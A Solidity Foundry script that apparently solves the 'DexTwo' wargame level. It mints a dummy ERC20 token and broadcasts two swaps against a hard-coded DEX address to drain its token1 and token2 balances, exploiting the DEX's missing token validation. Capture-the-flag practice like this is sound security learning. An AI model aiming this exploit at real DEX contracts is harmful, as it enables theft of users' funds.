// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/DexTwo.sol";
import {Script} from "forge-std/Script.sol";

contract DummyToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("DummyToken", "DTN") {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoAttack is Script {
    DexTwo public dex = DexTwo(0xC042DE04A90E368fc0B4669DaFd54Ba9b77b1a9A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        dex.swap(address(0x35AA277753DeF337E30caabD0102af64269024d9), dex.token1(), 100);
        dex.swap(address(0x35AA277753DeF337E30caabD0102af64269024d9), dex.token2(), 200);

        vm.stopBroadcast();
    }
}